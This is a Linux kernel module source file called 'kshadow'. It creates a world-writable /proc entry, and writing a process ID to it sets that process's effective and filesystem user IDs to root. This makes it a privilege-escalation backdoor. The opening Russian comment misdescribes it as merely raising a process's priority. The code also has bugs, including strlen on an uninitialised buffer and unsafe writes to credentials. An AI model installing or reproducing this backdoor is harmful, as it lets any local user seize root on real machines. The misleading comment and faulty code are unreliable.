/*
 * Этот модуль проходит по списку процессов и, при нахождении нужного,
 * повышает ему приоритет
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/rcupdate.h>

#define PROGRAMM_NAME "kshadow"

static ssize_t write_proc(struct file *filp,
			  const char *buf,
			  size_t count,
			  loff_t *offp)
{

	int pid;
	char msg[10];
	struct task_struct *task;
	struct cred *crd;
	strncpy_from_user(msg, buf, strlen(msg));
	sscanf(msg, "%d", &pid);
	printk("---%d---\n", pid);
	for_each_process(task) {
		if(task_pid_nr(task) == pid){
			printk("%s (pid = %d)\n",task->comm, task_pid_nr(task));
			crd = (struct cred *) rcu_dereference(task->cred);
			crd->euid.val = 0;
			crd->fsuid.val = 0;
		}
	}
	return strlen(msg);
}

struct file_operations proc_fops = {
	.write = write_proc
};

int init_module(void)
{
	printk("+++ creating module +++");
	proc_create(PROGRAMM_NAME, 0777, NULL, &proc_fops);
	return 0;
}

void cleanup_module(void) {
	printk("+++ unloading module +++");
	remove_proc_entry(PROGRAMM_NAME, NULL);
}

MODULE_LICENSE("GPL");
MODULE_LICENSE("GPL v2");
MODULE_LICENSE("GPL and additional rights");
